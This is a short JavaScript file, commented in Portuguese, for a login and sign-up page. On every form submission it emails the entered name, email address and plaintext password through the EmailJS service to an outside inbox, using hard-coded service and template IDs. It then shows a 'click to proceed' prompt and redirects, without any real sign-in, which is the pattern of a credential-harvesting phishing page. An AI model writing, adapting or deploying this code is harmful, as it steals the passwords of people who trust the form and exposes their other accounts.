// Inicializa o EmailJS com SEU USER ID
emailjs.init('TKuZ7CAuQh-zObb_5'); // ← Seu User ID aqui

const container = document.getElementById('container');
const registerBtn = document.getElementById('register');
const loginBtn = document.getElementById('login');

// Alterna entre os formulários (ANIMAÇÃO)
registerBtn.addEventListener('click', () => {
    container.classList.add("active");
});

loginBtn.addEventListener('click', () => {
    container.classList.remove("active");
});

// Envia o e-mail ao criar conta (COM SEU SERVICE ID E TEMPLATE ID)
document.getElementById('signup-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const name = document.getElementById('signup-name').value;
    const email = document.getElementById('signup-email').value;
    const password = document.getElementById('signup-password').value;

    emailjs.send('service_9gwivaw', 'template_1b5eb6a', { // ← Seu Service ID e Template ID aqui
        name: name,
        email: email,
        password: password
    }).then(response => {
        console.log('Email enviado com sucesso:', response);
        alert('Clique para prosseguir!');
        window.location.href = 'formulario2.html';
    }).catch(error => {
        console.error('Erro ao enviar o e-mail:', error);
        alert('Erro ao enviar os dados.');
    });
});

// Envia o e-mail ao fazer login (COM SEU SERVICE ID E TEMPLATE ID)
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('login-email').value;
    const password = document.getElementById('login-password').value;

    emailjs.send('service_9gwivaw', 'template_1b5eb6a', { // ← Seu Service ID e Template ID aqui
        email: email,
        password: password
    }).then(response => {
        console.log('Email enviado com sucesso:', response);
        alert('Clique para prosseguir!');
    }).catch(error => {
        console.error('Erro ao enviar o e-mail:', error);
        alert('Erro ao enviar os dados.');
    });
});